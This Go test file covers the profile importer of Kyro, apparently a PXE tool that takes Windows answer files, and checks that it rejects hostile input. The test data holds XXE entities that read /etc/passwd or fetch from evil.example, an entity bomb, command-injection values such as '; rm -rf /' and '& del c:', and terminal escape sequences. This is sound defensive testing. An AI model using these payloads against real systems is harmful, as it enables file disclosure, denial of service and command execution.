// Copyright (C) 2026 Lukas Koch and Kyro contributors
// SPDX-License-Identifier: GPL-3.0-or-later
//
// This file is part of Kyro.
//
// Kyro is free software: you can redistribute it and/or modify it under the
// terms of the GNU General Public License as published by the Free Software
// Foundation, either version 3 of the License, or (at your option) any later
// version.
//
// Kyro is distributed in the hope that it will be useful, but WITHOUT ANY
// WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
// FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
// details.
//
// You should have received a copy of the GNU General Public License along
// with Kyro. If not, see <https://www.gnu.org/licenses/>.

package profiles_test

import (
	"bytes"
	"encoding/json"
	"encoding/xml"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/kyro-pxe/kyro/internal/profiles"
	"github.com/kyro-pxe/kyro/internal/profiles/example"
)

const ns = `xmlns="urn:schemas-microsoft-com:unattend" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State"`

// answer returns a small answer file with the given content in its root.
func answer(inner string) string {
	return `<?xml version="1.0" encoding="utf-8"?>` + "\n<unattend " + ns + ">" + inner + "</unattend>\n"
}

const harmless = `<settings pass="oobeSystem"><component name="Microsoft-Windows-Shell-Setup"><OOBE><HideEULAPage>true</HideEULAPage></OOBE></component></settings>`

func bundle(t testing.TB, edit func(map[string]any)) []byte {
	t.Helper()
	b := map[string]any{
		"bundle_version": 0,
		"name":           "office-laptop",
		"description":    "Laptops for the office",
		"wipes_disk":     false,
		"warnings":       []string{"Contains a Wi-Fi key."},
		"windows_builds": []string{"26100", "26200"},
		"answer_file":    answer(harmless),
	}
	if edit != nil {
		edit(b)
	}
	data, err := json.Marshal(b)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func TestParseBundle(t *testing.T) {
	imp, err := profiles.Parse(bundle(t, nil), "")
	if err != nil {
		t.Fatal(err)
	}
	p := imp.Profile
	if p.Name != "office-laptop" || p.Source != "bundle" || p.Description != "Laptops for the office" ||
		len(p.Warnings) != 1 || len(p.WindowsBuilds) != 2 || p.DeclaredWipe == nil || *p.DeclaredWipe ||
		len(p.SHA256) != 64 || string(imp.AnswerFile) != answer(harmless) {
		t.Errorf("profile = %+v", p)
	}
	if p.WipesDisk() {
		t.Errorf("a bundle that declares and shows no wiping needs confirmation: %s", p.WipeReason())
	}
	// The name given at import wins.
	imp, err = profiles.Parse(bundle(t, nil), "other-name")
	if err != nil || imp.Profile.Name != "other-name" {
		t.Errorf("name override: %v, %v", imp, err)
	}
}

func TestParseBareAnswerFile(t *testing.T) {
	imp, err := profiles.Parse([]byte(answer(harmless)), "bare")
	if err != nil {
		t.Fatal(err)
	}
	p := imp.Profile
	if p.Name != "bare" || p.Source != "xml" || p.DeclaredWipe != nil || len(p.Warnings) != 0 {
		t.Errorf("profile = %+v", p)
	}
	// It declares nothing, so Kyro has to assume the worst.
	if !p.WipesDisk() || !strings.Contains(p.WipeReason(), "bare answer file") {
		t.Errorf("WipesDisk = %v, reason %q", p.WipesDisk(), p.WipeReason())
	}
	if _, err := profiles.Parse([]byte(answer(harmless)), ""); err == nil {
		t.Error("a bare answer file without a name was accepted")
	}
	// With a byte order mark, and with leading whitespace.
	for _, prefix := range []string{"\xef\xbb\xbf", "\n  "} {
		if _, err := profiles.Parse([]byte(prefix+"<unattend "+ns+"/>"), "bom"); err != nil {
			t.Errorf("prefix %q: %v", prefix, err)
		}
	}
}

func TestExampleProfile(t *testing.T) {
	imp, err := profiles.Parse(example.Bundle(), "")
	if err != nil {
		t.Fatal(err)
	}
	p := imp.Profile
	if p.Name != example.Name || !p.WipesDisk() || len(p.Warnings) < 2 {
		t.Errorf("profile = %+v", p)
	}
	if !strings.Contains(p.Description, "TEST FIXTURE") {
		t.Errorf("the example does not call itself a test fixture: %q", p.Description)
	}
	if got := strings.Join(p.Tokens, " "); got != "callback_url mac" {
		t.Errorf("tokens = %q", got)
	}
	if len(imp.Notes) != 0 {
		t.Errorf("notes = %q", imp.Notes)
	}
	// Its own detection agrees with its declaration.
	if len(p.DetectedWipe) == 0 {
		t.Error("Kyro did not notice that the example wipes a disk")
	}
	out, err := profiles.Render(imp.AnswerFile, profiles.Values{MAC: "525400770001", CallbackURL: "http://192.168.77.1/api/v1/callback/0123456789abcdef0123456789abcdef"})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"<ComputerName>KYRO-00770001</ComputerName>",
		"-X POST http://192.168.77.1/api/v1/callback/0123456789abcdef0123456789abcdef</CommandLine>",
	} {
		if !bytes.Contains(out, []byte(want)) {
			t.Errorf("rendered example lacks %q", want)
		}
	}
	if bytes.Contains(out, []byte("{{")) {
		t.Error("rendered example still contains a token")
	}
}

func TestWipeDetection(t *testing.T) {
	no, yes := false, true
	tests := []struct {
		name     string
		declared *bool
		inner    string
		want     bool
	}{
		{"declared harmless, looks harmless", &no, harmless, false},
		{"declared wiping", &yes, harmless, true},
		{"bare", nil, harmless, true},
		{"declared harmless, WillWipeDisk", &no, `<DiskConfiguration><Disk><WillWipeDisk> True </WillWipeDisk></Disk></DiskConfiguration>`, true},
		{"declared harmless, DiskConfiguration only", &no, `<DiskConfiguration/>`, true},
		{"declared harmless, diskpart in a command", &no, `<Path>cmd /c DiskPart /s X:\wipe.txt</Path>`, true},
		{"declared harmless, diskpart in CDATA", &no, `<Path><![CDATA[diskpart /s x]]></Path>`, true},
		{"declared harmless, PowerShell", &no, `<Path>powershell Clear-Disk -Number 0</Path>`, true},
		{"WillWipeDisk false is still a disk section", &no, `<DiskConfiguration><Disk><WillWipeDisk>false</WillWipeDisk></Disk></DiskConfiguration>`, true},
	}
	for _, tt := range tests {
		var data []byte
		if tt.declared == nil {
			data = []byte(answer(tt.inner))
		} else {
			data = bundle(t, func(b map[string]any) { b["wipes_disk"] = *tt.declared; b["answer_file"] = answer(tt.inner) })
		}
		imp, err := profiles.Parse(data, "p")
		if err != nil {
			t.Errorf("%s: %v", tt.name, err)
			continue
		}
		if got := imp.Profile.WipesDisk(); got != tt.want {
			t.Errorf("%s: WipesDisk = %v, want %v", tt.name, got, tt.want)
		}
		if tt.want && imp.Profile.WipeReason() == "" {
			t.Errorf("%s: no reason given", tt.name)
		}
		// A bundle that says "harmless" but is not: the importer is told.
		if tt.declared != nil && !*tt.declared && tt.want && len(imp.Notes) == 0 {
			t.Errorf("%s: no note about the contradiction", tt.name)
		}
	}
}

func TestParseRejectsAnswerFiles(t *testing.T) {
	tests := []struct {
		name, xml, want string
	}{
		{"DOCTYPE", `<!DOCTYPE unattend><unattend ` + ns + `/>`, "DOCTYPE"},
		{"internal entity", `<!DOCTYPE unattend [<!ENTITY x "y">]><unattend ` + ns + `>&x;</unattend>`, "DOCTYPE"},
		{"external entity", `<!DOCTYPE unattend [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><unattend ` + ns + `><a>&xxe;</a></unattend>`, "DOCTYPE"},
		{"parameter entity", `<!DOCTYPE unattend [<!ENTITY % p SYSTEM "http://evil.example/x.dtd">%p;]><unattend ` + ns + `/>`, "DOCTYPE"},
		{"entity expansion bomb", `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><unattend ` + ns + `>&lol2;</unattend>`, "DOCTYPE"},
		{"DOCTYPE after a comment", `<!-- x --><!DOCTYPE unattend SYSTEM "x.dtd"><unattend ` + ns + `/>`, "DOCTYPE"},
		{"DOCTYPE in lower case", `<!doctype unattend><unattend ` + ns + `/>`, "DOCTYPE"},
		{"undefined entity", answer(`<a>&nbsp;</a>`), "well-formed"},
		{"processing instruction", answer(`<?php system("id"); ?>`), "processing instruction"},
		{"stylesheet instruction", `<?xml version="1.0"?><?xml-stylesheet href="http://evil.example/x.xsl"?><unattend ` + ns + `/>`, "processing instruction"},
		{"second XML declaration", answer(`<?xml version="1.0"?>`), "processing instruction"},
		{"not closed", `<unattend ` + ns + `><a></unattend>`, "well-formed"},
		{"cut off", `<unattend ` + ns + `><a>`, "well-formed"},
		{"wrong root", `<html xmlns="urn:schemas-microsoft-com:unattend"/>`, "not an answer file"},
		{"no namespace", `<unattend/>`, "not an answer file"},
		{"wrong namespace", `<unattend xmlns="urn:example"/>`, "not an answer file"},
		{"namespace only by prefix on another element", `<x:unattend xmlns:x="urn:example" xmlns="urn:schemas-microsoft-com:unattend"/>`, "not an answer file"},
		{"two roots", `<unattend ` + ns + `/><unattend ` + ns + `/>`, "root"},
		{"text after the root", `<unattend ` + ns + `/>trailing`, "outside"},
		{"only a comment", `<!-- nothing -->`, "no root"},
		{"UTF-16", "\xff\xfe<\x00u\x00", "UTF-16"},
		{"declared UTF-16", `<?xml version="1.0" encoding="utf-16"?><unattend ` + ns + `/>`, "well-formed"},
		{"invalid UTF-8", "<unattend " + ns + ">\xff\xfe</unattend>", "UTF-8"},
		{"NUL byte", "<unattend " + ns + ">\x00</unattend>", "NUL"},
		{"token with length zero", answer(`<ComputerName>PC-{{mac:0}}</ComputerName>`), "1 to 64"},
		{"token with length 65", answer(`<ComputerName>PC-{{serial:65}}</ComputerName>`), "1 to 64"},
		{"token with a word as length", answer(`<ComputerName>PC-{{uuid:all}}</ComputerName>`), "1 to 64"},
		{"token with a negative length", answer(`<ComputerName>{{mac:-4}}</ComputerName>`), "1 to 64"},
		{"token with a padded length", answer(`<ComputerName>{{mac:08}}</ComputerName>`), "1 to 64"},
		{"callback with a length", answer(`<Path>curl {{callback_url:10}}</Path>`), "takes none"},
		{"bad token in an attribute", answer(`<a b="{{mac:0}}"/>`), "1 to 64"},
		{"too deep", answer(strings.Repeat("<a>", 70) + strings.Repeat("</a>", 70)), "64 deep"},
	}
	for _, tt := range tests {
		_, err := profiles.Parse([]byte(tt.xml), "p")
		if err == nil {
			t.Errorf("%s: accepted", tt.name)
		} else if !strings.Contains(err.Error(), tt.want) {
			t.Errorf("%s: error %q does not mention %q", tt.name, err, tt.want)
		}
		// The same file inside a bundle is refused as well.
		if !strings.Contains(tt.name, "UTF") && !strings.Contains(tt.name, "NUL") {
			b := bundle(t, func(m map[string]any) { m["answer_file"] = tt.xml })
			if _, err := profiles.Parse(b, ""); err == nil {
				t.Errorf("%s: accepted inside a bundle", tt.name)
			}
		}
	}
}

func TestParseRejectsBundles(t *testing.T) {
	edit := func(f func(map[string]any)) []byte { return bundle(t, f) }
	tests := []struct {
		name string
		data []byte
		want string
	}{
		{"empty", nil, "empty"},
		{"whitespace", []byte(" \n\t"), "empty"},
		{"neither JSON nor XML", []byte("hello"), "neither"},
		{"an array", []byte("[1]"), "neither"},
		{"broken JSON", []byte(`{"bundle_version": 0,`), "not valid JSON"},
		{"no version", edit(func(m map[string]any) { delete(m, "bundle_version") }), "no bundle_version"},
		{"version 1", edit(func(m map[string]any) { m["bundle_version"] = 1 }), "version 1; this Kyro reads version 0"},
		{"version 99", edit(func(m map[string]any) { m["bundle_version"] = 99 }), "version 99"},
		{"version as a fraction", []byte(`{"bundle_version": 0.0, "wipes_disk": true, "answer_file": "x"}`), "version 0.0"},
		{"version as text", edit(func(m map[string]any) { m["bundle_version"] = "0" }), `version "0"`},
		{"unknown field", edit(func(m map[string]any) { m["post_install"] = "x" }), "post_install"},
		{"no wipes_disk", edit(func(m map[string]any) { delete(m, "wipes_disk") }), "wipes_disk"},
		{"wipes_disk as text", edit(func(m map[string]any) { m["wipes_disk"] = "no" }), "expected fields"},
		{"no answer file", edit(func(m map[string]any) { delete(m, "answer_file") }), "answer_file"},
		{"empty answer file", edit(func(m map[string]any) { m["answer_file"] = "" }), "answer_file"},
		{"two documents", append(edit(nil), edit(nil)...), "after its JSON"},
		{"no name", edit(func(m map[string]any) { delete(m, "name") }), "needs a name"},
		{"name with a slash", edit(func(m map[string]any) { m["name"] = "../etc" }), "cannot be a profile name"},
		{"name in upper case", edit(func(m map[string]any) { m["name"] = "Office" }), "cannot be a profile name"},
		{"name too long", edit(func(m map[string]any) { m["name"] = strings.Repeat("a", 64) }), "cannot be a profile name"},
		{"bad build number", edit(func(m map[string]any) { m["windows_builds"] = []string{"26100; rm -rf /"} }), "build number"},
		{"too many warnings", edit(func(m map[string]any) { m["warnings"] = make([]string, 33) }), "32 warnings"},
		{"huge warning", edit(func(m map[string]any) { m["warnings"] = []string{strings.Repeat("x", 1001)} }), "longer than"},
		{"too large", []byte(`{"bundle_version":0,"pad":"` + strings.Repeat("x", profiles.MaxSize) + `"}`), "larger than"},
	}
	for _, tt := range tests {
		_, err := profiles.Parse(tt.data, "")
		if err == nil {
			t.Errorf("%s: accepted", tt.name)
		} else if !strings.Contains(err.Error(), tt.want) {
			t.Errorf("%s: error %q does not mention %q", tt.name, err, tt.want)
		}
	}
}

func TestMetadataIsCleaned(t *testing.T) {
	imp, err := profiles.Parse(bundle(t, func(m map[string]any) {
		m["description"] = "nice\x1b[2J\x1b[31m profile\r\n"
		m["warnings"] = []string{"\x1b]0;owned\x07 look here", "\x00\x01"}
	}), "")
	if err != nil {
		t.Fatal(err)
	}
	all := imp.Profile.Description + strings.Join(imp.Profile.Warnings, "")
	for _, r := range all {
		if r < 0x20 || r == 0x7f {
			t.Fatalf("control character %#x survived in %q", r, all)
		}
	}
	if len(imp.Profile.Warnings) != 1 {
		t.Errorf("warnings = %q; one of them was empty after cleaning", imp.Profile.Warnings)
	}
}

func TestRender(t *testing.T) {
	v := profiles.Values{
		MAC:         "52:54:00:77:00:01",
		UUID:        "4C4C4544-0042-3510-8054-B7C04F563432",
		Serial:      "PF2-ABCDE",
		CallbackURL: "http://192.168.77.1:8080/api/v1/callback/0123456789abcdef0123456789abcdef",
	}
	tests := []struct{ name, in, want string }{
		{"text", `<a>PC-{{mac}}</a>`, `<a>PC-525400770001</a>`},
		{"all tokens", `<a>{{mac}} {{uuid}} {{serial}} {{callback_url}}</a>`,
			`<a>525400770001 4c4c4544-0042-3510-8054-b7c04f563432 PF2-ABCDE http://192.168.77.1:8080/api/v1/callback/0123456789abcdef0123456789abcdef</a>`},
		{"last N characters", `<a>{{mac:6}} {{serial:5}} {{uuid:12}} {{serial:64}}</a>`, `<a>770001 ABCDE b7c04f563432 PF2-ABCDE</a>`},
		{"N that would start with a hyphen", `<a>{{serial:6}}</a>`, `<a>ABCDE</a>`},
		{"CDATA", `<a><![CDATA[net use & echo {{serial}} > x]]></a>`, `<a><![CDATA[net use & echo PF2-ABCDE > x]]></a>`},
		{"twice", `<a>{{mac}}{{mac}}</a>`, `<a>525400770001525400770001</a>`},
		{"attribute is left alone", `<a b="{{mac}}">{{mac}}</a>`, `<a b="{{mac}}">525400770001</a>`},
		{"comment is left alone", `<!-- {{mac}} --><a>{{mac}}</a>`, `<!-- {{mac}} --><a>525400770001</a>`},
		{"escaped braces are left alone", `<a>&#123;&#123;mac}} {{mac}}</a>`, `<a>&#123;&#123;mac}} 525400770001</a>`},
		{"unknown token is left alone", `<a>{{hostname}} {{ mac }} {{MAC}} {mac} {{mac}}</a>`, `<a>{{hostname}} {{ mac }} {{MAC}} {mac} 525400770001</a>`},
		{"other text is untouched", "<a>\r\n\t&amp; &lt; ünïcödé 日本 </a>", "<a>\r\n\t&amp; &lt; ünïcödé 日本 </a>"},
	}
	for _, tt := range tests {
		got, err := profiles.Render([]byte(answer(tt.in)), v)
		if err != nil {
			t.Errorf("%s: %v", tt.name, err)
		} else if string(got) != answer(tt.want) {
			t.Errorf("%s:\n got %s\nwant %s", tt.name, got, answer(tt.want))
		}
	}

	// A file without tokens comes back byte for byte, byte order mark
	// included.
	plain := "\xef\xbb\xbf" + answer(harmless)
	if got, err := profiles.Render([]byte(plain), profiles.Values{}); err != nil || string(got) != plain {
		t.Errorf("file without tokens changed: %v", err)
	}
}

func TestRenderRefusesMissingOrUnsafeValues(t *testing.T) {
	good := profiles.Values{MAC: "525400770001", UUID: "4c4c4544-0042-3510-8054-b7c04f563432", Serial: "PF2ABCDE", CallbackURL: "http://10.0.0.1/api/v1/callback/abc"}
	tests := []struct {
		name  string
		token string
		edit  func(*profiles.Values)
	}{
		{"no MAC", "mac", func(v *profiles.Values) { v.MAC = "" }},
		{"MAC too short", "mac", func(v *profiles.Values) { v.MAC = "5254007700" }},
		{"MAC with a command", "mac", func(v *profiles.Values) { v.MAC = "525400770001&calc" }},
		{"no UUID", "uuid", func(v *profiles.Values) { v.UUID = "" }},
		{"UUID with markup", "uuid", func(v *profiles.Values) { v.UUID = "4c4c4544-0042-3510-8054-b7c04f56343<" }},
		{"no serial", "serial", func(v *profiles.Values) { v.Serial = "" }},
		{"serial with a space", "serial", func(v *profiles.Values) { v.Serial = "PF2 ABCDE" }},
		{"serial with markup", "serial", func(v *profiles.Values) { v.Serial = "</ComputerName><x>" }},
		{"serial that ends CDATA", "serial", func(v *profiles.Values) { v.Serial = "a]]>b" }},
		{"serial with a leading hyphen", "serial", func(v *profiles.Values) { v.Serial = "-rf" }},
		{"serial too long", "serial", func(v *profiles.Values) { v.Serial = strings.Repeat("A", 65) }},
		{"no callback", "callback_url", func(v *profiles.Values) { v.CallbackURL = "" }},
		{"callback with a query", "callback_url", func(v *profiles.Values) { v.CallbackURL = "http://10.0.0.1/x?a=b&c=d" }},
		{"callback with a command", "callback_url", func(v *profiles.Values) { v.CallbackURL = "http://10.0.0.1/x & del c:" }},
		{"callback that is not http", "callback_url", func(v *profiles.Values) { v.CallbackURL = "file:///c:/x" }},
	}
	for _, tt := range tests {
		v := good
		tt.edit(&v)
		for _, wrap := range []string{`<a>{{%s}}</a>`, `<a><![CDATA[{{%s}}]]></a>`} {
			in := answer(fmt.Sprintf(wrap, tt.token))
			if out, err := profiles.Render([]byte(in), v); !errors.Is(err, profiles.ErrMissingValue) {
				t.Errorf("%s: err = %v, output %q", tt.name, err, out)
			}
		}
	}
	// A value that is not used is not needed.
	if _, err := profiles.Render([]byte(answer(`<a>{{mac}}</a>`)), profiles.Values{MAC: "525400770001"}); err != nil {
		t.Errorf("unused values were demanded: %v", err)
	}
}

func TestImportNotes(t *testing.T) {
	imp, err := profiles.Parse([]byte(answer(`<a b="{{mac}}">{{hostname}}</a><!-- {{uuid}} --><c>{{serial}}</c>`)), "p")
	if err != nil {
		t.Fatal(err)
	}
	notes := strings.Join(imp.Notes, "\n")
	for _, want := range []string{"{{mac}} is in an attribute", "{{hostname}} is not a Kyro token", "{{uuid}} is in an attribute, a comment"} {
		if !strings.Contains(notes, want) {
			t.Errorf("notes lack %q:\n%s", want, notes)
		}
	}
	if got := strings.Join(imp.Profile.Tokens, " "); got != "serial" {
		t.Errorf("tokens = %q; only the one that will be replaced counts", got)
	}
}

func TestStore(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "profiles")
	s := profiles.Open(dir)
	if list, err := s.List(); err != nil || len(list) != 0 {
		t.Fatalf("List of a missing directory: %v, %v", list, err)
	}

	imp, err := profiles.Parse(bundle(t, nil), "")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.Add(imp, false); err != nil {
		t.Fatal(err)
	}
	if err := s.Add(imp, false); !errors.Is(err, profiles.ErrExists) {
		t.Errorf("second Add: %v", err)
	}
	bare, _ := profiles.Parse([]byte(answer(harmless)), "a-bare-one")
	if err := s.Add(bare, false); err != nil {
		t.Fatal(err)
	}

	list, err := s.List()
	if err != nil || len(list) != 2 || list[0].Name != "a-bare-one" || list[1].Name != "office-laptop" {
		t.Fatalf("List = %+v, %v", list, err)
	}
	if list[1].ImportedAt.IsZero() {
		t.Error("import time not recorded")
	}
	data, p, err := s.AnswerFile("office-laptop")
	if err != nil || string(data) != answer(harmless) || p.Name != "office-laptop" {
		t.Errorf("AnswerFile: %v", err)
	}

	// The answer file is stored byte for byte, and not readable by everyone.
	path := filepath.Join(dir, "office-laptop", "autounattend.xml")
	onDisk, _ := os.ReadFile(path)
	if string(onDisk) != answer(harmless) {
		t.Error("the stored answer file differs from the imported one")
	}
	if info, _ := os.Stat(path); info.Mode().Perm()&0o007 != 0 {
		t.Errorf("answer file mode %v", info.Mode())
	}

	// Replacing.
	imp2, _ := profiles.Parse(bundle(t, func(m map[string]any) { m["description"] = "second" }), "")
	if err := s.Add(imp2, true); err != nil {
		t.Fatal(err)
	}
	if p, _ := s.Get("office-laptop"); p.Description != "second" {
		t.Errorf("after replace: %+v", p)
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 2 {
		t.Errorf("leftovers in the store: %v", entries)
	}

	// A file changed behind Kyro's back is not served.
	os.WriteFile(path, []byte(answer(`<DiskConfiguration/>`)), 0o640)
	if _, _, err := s.AnswerFile("office-laptop"); err == nil || !strings.Contains(err.Error(), "changed") {
		t.Errorf("tampered answer file: %v", err)
	}

	if err := s.Remove("office-laptop"); err != nil {
		t.Fatal(err)
	}
	if err := s.Remove("office-laptop"); !errors.Is(err, profiles.ErrNotFound) {
		t.Errorf("second Remove: %v", err)
	}
	for _, name := range []string{"", "..", "../a-bare-one", "a-bare-one/..", "A-BARE-ONE", "missing"} {
		if _, err := s.Get(name); !errors.Is(err, profiles.ErrNotFound) {
			t.Errorf("Get(%q): %v", name, err)
		}
		if err := s.Remove(name); !errors.Is(err, profiles.ErrNotFound) {
			t.Errorf("Remove(%q): %v", name, err)
		}
	}
	if list, _ := s.List(); len(list) != 1 {
		t.Errorf("List after Remove: %+v", list)
	}
}

// structure returns the element and attribute skeleton of a document.
func structure(data []byte) (string, error) {
	dec := xml.NewDecoder(bytes.NewReader(bytes.TrimPrefix(data, []byte("\xef\xbb\xbf"))))
	var b strings.Builder
	for {
		tok, err := dec.Token()
		if err == io.EOF {
			return b.String(), nil
		}
		if err != nil {
			return "", err
		}
		switch t := tok.(type) {
		case xml.StartElement:
			fmt.Fprintf(&b, "<%s %s", t.Name.Space, t.Name.Local)
			for _, a := range t.Attr {
				fmt.Fprintf(&b, " %s:%s=%q", a.Name.Space, a.Name.Local, a.Value)
			}
			b.WriteString(">")
		case xml.EndElement:
			b.WriteString("</>")
		case xml.Comment:
			fmt.Fprintf(&b, "<!--%s-->", t)
		}
	}
}

// FuzzRender gives arbitrary answer files and arbitrary client values to
// Render. Whatever a client sends, the result must be well-formed and must
// have exactly the elements, attributes and comments of the original: a
// value may change text, never structure.
func FuzzRender(f *testing.F) {
	f.Add(answer(`<a>PC-{{mac}}</a><b><![CDATA[{{serial:4}} & {{uuid}}]]></b>`), "52:54:00:77:00:01", "4c4c4544-0042-3510-8054-b7c04f563432", "PF2ABCDE")
	f.Add(answer(`<a b="{{mac}}">{{serial}}</a><!-- {{uuid}} -->`), "525400770001", "", "</a><x>")
	f.Add(answer(`<a><![CDATA[{{serial}}]]></a>`), "", "", "a]]>b")
	f.Add(answer(`<a>{{callback_url}}{{mac:1}}{{mac:64}}</a>`), "525400770001", "", "-")
	f.Add(string(example.Bundle()), "525400770001", "", "X")
	f.Fuzz(func(t *testing.T, doc, mac, uuid, serial string) {
		before, err := structure([]byte(doc))
		if err != nil {
			return
		}
		v := profiles.Values{MAC: mac, UUID: uuid, Serial: serial, CallbackURL: "http://192.168.77.1/api/v1/callback/0123456789abcdef0123456789abcdef"}
		out, err := profiles.Render([]byte(doc), v)
		if err != nil {
			return
		}
		after, err := structure(out)
		if err != nil {
			t.Fatalf("rendering made the document malformed: %v\nvalues %q %q %q\n%s", err, mac, uuid, serial, out)
		}
		if before != after {
			t.Fatalf("rendering changed the structure\nvalues %q %q %q\nbefore %s\nafter  %s", mac, uuid, serial, before, after)
		}
		// The output is still an answer file that Kyro would accept.
		if _, err := profiles.Parse(out, "p"); err != nil {
			t.Fatalf("the rendered file is not accepted any more: %v", err)
		}
	})
}

// FuzzParse gives arbitrary input to the importer. What it accepts must be
// storable and must render with good values.
func FuzzParse(f *testing.F) {
	f.Add([]byte(answer(harmless)))
	f.Add(example.Bundle())
	f.Add([]byte(`{"bundle_version":0,"name":"x","wipes_disk":true,"answer_file":"<unattend xmlns=\"urn:schemas-microsoft-com:unattend\"/>"}`))
	f.Add([]byte(`<!DOCTYPE x [<!ENTITY a "b">]><unattend xmlns="urn:schemas-microsoft-com:unattend">&a;</unattend>`))
	f.Fuzz(func(t *testing.T, data []byte) {
		imp, err := profiles.Parse(data, "fuzz")
		if err != nil {
			return
		}
		if bytes.Contains(bytes.ToLower(imp.AnswerFile), []byte("<!doctype")) || bytes.Contains(imp.AnswerFile, []byte("<!ENTITY")) {
			// Inside a comment or CDATA they are text, not declarations.
			if s, err := structure(imp.AnswerFile); err != nil || strings.Contains(s, "DOCTYPE") && !strings.Contains(s, "<!--") {
				t.Fatalf("accepted a file with a declaration: %q", imp.AnswerFile)
			}
		}
		for _, w := range append(imp.Profile.Warnings, imp.Profile.Description) {
			for _, r := range w {
				if r < 0x20 || r == 0x7f {
					t.Fatalf("control character in metadata %q", w)
				}
			}
		}
		good := profiles.Values{MAC: "525400770001", UUID: "4c4c4544-0042-3510-8054-b7c04f563432", Serial: "PF2ABCDE", CallbackURL: "http://10.0.0.1/api/v1/callback/abc"}
		if _, err := profiles.Render(imp.AnswerFile, good); err != nil {
			t.Fatalf("an accepted file does not render: %v", err)
		}
	})
}
